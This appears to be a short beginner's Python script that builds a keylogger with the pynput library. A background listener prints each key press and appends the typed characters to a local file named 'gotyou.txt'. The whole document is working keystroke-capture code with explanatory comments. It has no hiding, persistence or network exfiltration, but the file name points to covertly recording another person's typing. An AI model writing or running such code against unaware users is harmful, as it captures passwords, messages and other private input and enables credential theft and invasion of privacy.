from pynput import keyboard
#Pynput is a python library that contains the keyboard module that you can use to capture keyboard events that happen on your computer
#obviously, you install pynput ahead of time with pip install pynput

def keypressed(key):
    print(str(key))
    with open("gotyou.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char") 

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()